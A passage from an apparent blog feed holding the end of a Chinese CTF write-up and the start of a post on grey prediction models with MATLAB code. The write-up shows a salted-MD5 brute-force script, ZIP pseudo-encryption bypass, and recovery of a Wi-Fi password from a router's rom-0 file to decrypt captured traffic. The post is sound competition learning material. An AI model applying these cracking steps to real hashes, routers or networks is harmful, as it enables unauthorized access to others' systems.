punctuation">,</span><span class="token string">"c9fa4b0db317d88e2b10060225e92494.ebVnpMzS"</span><span class="token punctuation">,</span><span class="token string">"d0deab17d115bd6fdce8592bb3667643.bL5zwgvX"</span><span class="token punctuation">,</span><span class="token string">"006f0cb3a422716692f143f28eb0d187.NHXg1Fof"</span><span class="token punctuation">,</span><span class="token string">"ddc125de34da1a6ec0cbe401f147bc8f.GDai9Y0n"</span><span class="token punctuation">,</span><span class="token string">"be5052053c5a806e8f56ed64e0d67821.40alyH3w"</span><span class="token punctuation">,</span><span class="token string">"aaf18ac446b8c385c4112c10ae87e7dc.ZJQzuIL0"</span><span class="token punctuation">,</span><span class="token string">"a2db20a4b7386dc2d8c30bf9a05ceef7.QnpOlPWH"</span><span class="token punctuation">,</span><span class="token string">"8a4fbc32a3251bb51072d51969ba5d33.rtcbipeq"</span><span class="token punctuation">,</span><span class="token string">"5e35d2c9675ed811880cea01f268e00f.i1Hbne6h"</span><span class="token punctuation">,</span><span class="token string">"9da23007699e832f4e9344057c5e0bd3.EtbGpMSW"</span><span class="token punctuation">,</span><span class="token string">"f09233683d05171420f963fc92764e84.fxHoinEe"</span><span class="token punctuation">,</span><span class="token string">"4feabf309c5872f3cca7295b3577f2a8.KymkJXqA"</span><span class="token punctuation">,</span><span class="token string">"9b94da2fa9402a3fdb4ff15b9f3ba4d2.G3Tdr1Pg"</span><span class="token punctuation">,</span><span class="token string">"b3cd8d6b53702d733ba515dec1d770c5.Y71LJWZz"</span><span class="token punctuation">,</span><span class="token string">"6a5b3b2526bb7e94209c487585034534.rIwb4oxt"</span><span class="token punctuation">,</span><span class="token string">"e9728ef776144c25ba0155a0faab2526.e1sOXSb8"</span><span class="token punctuation">,</span><span class="token string">"d41a5e7a98e28d76dbd183df7e3bcb49.36bedvia"</span><span class="token punctuation">,</span><span class="token string">"81d5ebfea6aff129cf515d4e0e5f8360.dDG4qTjW"</span><span class="token punctuation">]</span>    n<span class="token operator">=</span><span class="token number">1234567880</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token operator">&lt;</span><span class="token number">10000000000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">66</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            salt <span class="token operator">=</span> password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            md5 <span class="token operator">=</span> password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">]</span>            mingwen <span class="token operator">=</span> <span class="token string">"{FLAG:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"}"</span><span class="token operator">+</span>password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            miwen <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>mingwen<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>miwen <span class="token operator">==</span> md5<span class="token punctuation">)</span> <span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                n<span class="token operator">=</span><span class="token number">10000000000</span>                <span class="token keyword">break</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>        n<span class="token operator">=</span>n<span class="token operator">+</span><span class="token number">1</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行效果：</p><p><img src="https://i.loli.net/2018/10/29/5bd5e5d2d3670.png" alt=""></p><p>flag:1234567890</p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Misc1-会飞的狗狗"><a href="#Misc1-会飞的狗狗" class="headerlink" title="Misc1-会飞的狗狗"></a>Misc1-会飞的狗狗</h3><p><img src="https://i.loli.net/2018/10/29/5bd5e67f18c7d.jpg" alt=""></p><p>直接查看文件内容可以得到末尾的base64字符串，接解码得到flag</p><p><img src="https://i.loli.net/2018/10/29/5bd5e6629e3e4.png" alt=""></p><h3 id="Misc2-文件类型分析"><a href="#Misc2-文件类型分析" class="headerlink" title="Misc2-文件类型分析"></a>Misc2-文件类型分析</h3><blockquote><p>得到一个zip压缩包，点开来看看，存在[content-types].xml文件，基本上可以确定是微软公司office套件的格式。简单试过doc，docx，ppt，pptx，xls，xlxs没用之后，查到xps：</p><p><img src="https://i.loli.net/2018/10/29/5bd5e705b81e3.png" alt=""></p><p>于是改为xps文件后缀即可，将xps提交。</p></blockquote><h3 id="Misc3-真真假假分不清楚"><a href="#Misc3-真真假假分不清楚" class="headerlink" title="Misc3-真真假假分不清楚"></a>Misc3-真真假假分不清楚</h3><blockquote><p>简单的一个伪加密，修改全局加密标志位，将奇数改为偶数即可。</p><p>{FLAG:011938d495c36aeab4bfbd897c240d31}</p></blockquote><h3 id="Misc4-诱人的音乐"><a href="#Misc4-诱人的音乐" class="headerlink" title="Misc4-诱人的音乐"></a>Misc4-诱人的音乐</h3><blockquote><p>这题的音频文件中存在一段摩斯电码（有的同学通过二进制getflag），通过音频分析软件可以将其提取出来：</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token comment" spellcheck="true">#一次性解码行不通，可以将其分为三段分别解码并且将三个非正常字符转为16进制：</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>晬<span class="token number">61677b6368</span>晬 <span class="token operator">==</span><span class="token operator">></span> <span class="token number">0x666c</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span>ㅰ<span class="token number">74756e65</span>ㅰ <span class="token operator">==</span><span class="token operator">></span> <span class="token number">0x3170</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span>張<span class="token number">337665727c</span>張 <span class="token operator">==</span><span class="token operator">></span> <span class="token number">0x5f35</span><span class="token comment" spellcheck="true">#进行拼接</span><span class="token number">666c61677b6368317074756e655f35337665727c</span><span class="token comment" spellcheck="true">#可以得到</span>flag<span class="token punctuation">{</span>ch1ptune_53ver<span class="token operator">|</span><span class="token comment" spellcheck="true">#提交ch1ptune_53ver即可</span></code></pre><h3 id="Misc5-神秘的文件名-未解出"><a href="#Misc5-神秘的文件名-未解出" class="headerlink" title="Misc5-神秘的文件名(未解出)"></a>Misc5-神秘的文件名(未解出)</h3><blockquote><p> 可以通过binwalk得到一个逆向题，较难，未解出。</p></blockquote><h2 id="网络协议分析"><a href="#网络协议分析" class="headerlink" title="网络协议分析"></a>网络协议分析</h2><h3 id="网络协议分析1-数据包里有甜甜圈哦"><a href="#网络协议分析1-数据包里有甜甜圈哦" class="headerlink" title="网络协议分析1-数据包里有甜甜圈哦~"></a>网络协议分析1-数据包里有甜甜圈哦~</h3><blockquote><p>wireshark打开数据包后，依次使用以下过滤规则:<br><code>http contains flag</code></p><p><code>tcp contains flag</code></p><p><code>udp contains flag</code></p><p>即可通过<code>udp contains flag</code>查到flag。</p><p><img src="https://i.loli.net/2018/10/29/5bd5eaff1fee2.png" alt=""></p></blockquote><h3 id="网络协议分析2-嘿嘿嘿-未解出"><a href="#网络协议分析2-嘿嘿嘿-未解出" class="headerlink" title="网络协议分析2-嘿嘿嘿(未解出)"></a>网络协议分析2-嘿嘿嘿(未解出)</h3><blockquote><p>经过疯狂手动提取后发现只能获得一丝图片，赛后得知需要用<strong>tcpflow</strong>这个神器重构损害的tcp数据，从而得到图像。</p></blockquote><h3 id="网络协议分析3-thief"><a href="#网络协议分析3-thief" class="headerlink" title="网络协议分析3-thief"></a>网络协议分析3-thief</h3><blockquote><p>拿到数据包打开后发现大部分都是<code>802.11 wlan</code>数据包，过滤一下http请求：</p><p><img src="https://i.loli.net/2018/10/29/5bd5ebef87b2d.png" alt=""></p><p>可以发现第一个请求的是<code>/rom-0</code>，确实不知为何就觉得这个是关键，google搜索一下：</p><p><img src="https://i.loli.net/2018/10/29/5bd5ed05ddbaa.png" alt=""></p><p>点进routerPwn发现是一个解压rom-0文件的网址，那我们是不是还缺一个文件。接下来通过导出http对象，我们可以得到一个rom0文件，正好将其解密得到以下内容：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#猜测是用来解密的密钥咯</span>Rome4040TP<span class="token operator">-</span>LINKpublicpublicpublicpublic</code></pre><p>在运用wireshark分析流量的过程中我们经常需要使用密钥之类的东西来解密流量，此处同样通过 <a href="https://blog.csdn.net/neal_hddnwpu/article/details/82586235?utm_source=blogxgwz2" target="_blank" rel="noopener">查询资料</a> 可以获得解密方式：</p><p><img src="https://i.loli.net/2018/10/29/5bd5eefeb803c.png" alt=""></p><p>将密码Rome4040导入解密，可以发现的确出现了<strong>很多http和tcp的包</strong>，根据题目提示使用过滤<code>http contains CTF</code>得到flag：</p><p><img src="https://i.loli.net/2018/10/29/5bd5ef72cfc64.png" alt=""></p></blockquote><blockquote><p>🆒wandoucup-CTF-WP到此结束。</p><p>Publish by Yof3ng👌。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;wandoucup-ctf&quot;&gt;&lt;a href=&quot;#wandoucup-ctf&quot; class=&quot;headerlink&quot; title=&quot;wandoucup-ctf&quot;&gt;&lt;/a&gt;wandoucup-ctf&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="流量分析" scheme="http://www.yof3ng.xyz/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>灰色预测</title>
    <link href="http://www.yof3ng.xyz/2018/10/27/%E7%81%B0%E8%89%B2%E9%A2%84%E6%B5%8B/"/>
    <id>http://www.yof3ng.xyz/2018/10/27/灰色预测/</id>
    <published>2018-10-27T12:45:10.000Z</published>
    <updated>2018-11-02T00:46:55.353Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="灰色预测（Grey-model）"><a href="#灰色预测（Grey-model）" class="headerlink" title="灰色预测（Grey model）"></a>灰色预测（Grey model）</h1><blockquote><p>简单了解一下灰色预测这玩意儿。haha🙂</p></blockquote><h2 id="什么是灰色预测？"><a href="#什么是灰色预测？" class="headerlink" title="什么是灰色预测？"></a>什么是灰色预测？</h2><blockquote><p>灰色理论：</p><p>通过对原始数据的处理挖掘系统变动规律，建立相应微分方程，从而预测事物未来发展状况。 </p><ul><li>优点：对于不确定因素的复杂系统预测效果较好，且所需样本数据较小； </li><li>缺点：基于指数率的预测没有考虑系统的随机性，中长期预测精度较差。</li></ul><p>百度百科是这么说的：</p><p><a href="https://baike.baidu.com/item/%E7%81%B0%E8%89%B2%E9%A2%84%E6%B5%8B/7534704" target="_blank" rel="noopener">灰色预测</a>是就<a href="https://baike.baidu.com/item/%E7%81%B0%E8%89%B2%E7%B3%BB%E7%BB%9F/9595581" target="_blank" rel="noopener">灰色系统</a>【灰色系统是指“部分信息已知，部分信息未知“的”小样本“，”贫信息“的不确定系统，以灰色模型（G,M）为核心的模型体系。】所做的预测。所谓灰色系统是介于白色系统和黑箱系统之间的过渡系统。其具体的含义是:如果某一系统的全部信息已知为白色系统，全部信息未知为黑箱系统，部分信息已知，部分信息未知，那么这一系统就是灰色系统。</p></blockquote><h2 id="那么什么又是灰色预测法呢？"><a href="#那么什么又是灰色预测法呢？" class="headerlink" title="那么什么又是灰色预测法呢？"></a>那么什么又是灰色预测法呢？</h2><blockquote><p>一般地说，<a href="https://baike.baidu.com/item/%E7%A4%BE%E4%BC%9A%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">社会系统</a>、<a href="https://baike.baidu.com/item/%E7%BB%8F%E6%B5%8E%E7%B3%BB%E7%BB%9F/3897147" target="_blank" rel="noopener">经济系统</a>、生态系统都是灰色系统。例如物价系统，导致物价上涨的因素很多，但已知的却不多，因此对物价这一灰色系统的预测可以用灰色预测方法。</p></blockquote><h2 id="灰色模型的应用"><a href="#灰色模型的应用" class="headerlink" title="灰色模型的应用"></a>灰色模型的应用</h2><blockquote><p>1、数列预测。对某现象随时间的顺延而发生的变化所做的预测定义为数列预测。例如对<a href="https://baike.baidu.com/item/%E6%B6%88%E8%B4%B9%E7%89%A9%E4%BB%B7%E6%8C%87%E6%95%B0" target="_blank" rel="noopener">消费物价指数</a>的预测，需要确定两个变量，一个是消费物价指数的水平。另一个是这一水平所发生的时间。</p><p>2、灾变预测。对发生灾害或异常突变时间可能发生的时间预测称为灾变预测。例如对地震时间的预测。</p><p>3、季节性灾变预测。对发生在每年特定时区的事件或命题作灰预测，称季节灾变灰预测。</p><p>4、拓扑预测。将原始数据作曲线，在曲线上按定值寻找该定值发生的所有<a href="https://baike.baidu.com/item/%E6%97%B6%E7%82%B9" target="_blank" rel="noopener">时点</a>，并以该定值为框架构成<a href="https://baike.baidu.com/item/%E6%97%B6%E7%82%B9%E6%95%B0%E5%88%97" target="_blank" rel="noopener">时点数列</a>，然后建立模型预测未来该定值所发生的时点。</p><p>5、<a href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E9%A2%84%E6%B5%8B/12609292" target="_blank" rel="noopener">系统预测</a>。对系统中众多变量间相互协调关系的发展变化所进行的预测称为系统预测。例如市场中<a href="https://baike.baidu.com/item/%E6%9B%BF%E4%BB%A3%E5%95%86%E5%93%81" target="_blank" rel="noopener">替代商品</a>、相互关联商品<a href="https://baike.baidu.com/item/%E9%94%80%E5%94%AE%E9%87%8F" target="_blank" rel="noopener">销售量</a>互相制约的预测。</p><p>6、包络灰预测。对于难以用数列预测或灾变预测处理，也不必用拓扑预测计算的离乱序列，可以构造上边界 GM(1，1) 与下边界 GM(1，1) 进行覆盖，这种边界模型即包络模型。</p></blockquote><h2 id="灰色模型测试"><a href="#灰色模型测试" class="headerlink" title="灰色模型测试"></a>灰色模型测试</h2><p>以sin(pi*x/20)函数为例，以单调性为区间检验灰色模型预测的精度 。</p><pre class=" language-matlab"><code class="language-matlab"><span class="token comment" spellcheck="true">%摘自Angel_kitty师傅的matlab程序代码</span>clcclear all<span class="token comment" spellcheck="true">% 本程序主要用来计算根据灰色理论建立的模型的预测值。</span><span class="token comment" spellcheck="true">% 应用的数学模型是 GM(1,1)。</span><span class="token comment" spellcheck="true">% 原始数据的处理方法是一次累加法。</span>x<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>x1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>x2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>y<span class="token operator">=</span><span class="token function">sin</span><span class="token punctuation">(</span><span class="token keyword">pi</span><span class="token operator">*</span>x<span class="token operator">/</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>n<span class="token operator">=</span><span class="token function">length</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>yy<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n    <span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>B<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">)</span>    <span class="token function">B</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">B</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">end</span>BT<span class="token operator">=</span>B<span class="token operator">'</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n<span class="token number">-1</span>    <span class="token function">YN</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>YN<span class="token operator">=</span>YN<span class="token operator">'</span><span class="token punctuation">;</span>A<span class="token operator">=</span><span class="token function">inv</span><span class="token punctuation">(</span>BT<span class="token operator">*</span>B<span class="token punctuation">)</span><span class="token operator">*</span>BT<span class="token operator">*</span>YN<span class="token punctuation">;</span>a<span class="token operator">=</span><span class="token function">A</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>u<span class="token operator">=</span><span class="token function">A</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>t<span class="token operator">=</span>u<span class="token operator">/</span>a<span class="token punctuation">;</span>t_test<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">%需要预测个数</span><span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>t_test<span class="token operator">+</span>n<span class="token punctuation">;</span><span class="token function">yys</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span>t<span class="token punctuation">)</span><span class="token operator">.*</span><span class="token function">exp</span><span class="token punctuation">(</span><span class="token operator">-</span>a<span class="token operator">.*</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span>t<span class="token punctuation">;</span><span class="token function">yys</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span>n<span class="token operator">+</span>t_test<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">2</span>    <span class="token function">ys</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yys</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">yys</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>x<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n<span class="token punctuation">;</span>xs<span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n<span class="token operator">+</span>t_test<span class="token punctuation">;</span>yn<span class="token operator">=</span><span class="token function">ys</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">:</span>n<span class="token operator">+</span>t_test<span class="token punctuation">)</span><span class="token punctuation">;</span>det<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n    det<span class="token operator">=</span>det<span class="token operator">+</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">yn</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>det<span class="token operator">=</span>det<span class="token operator">/</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token 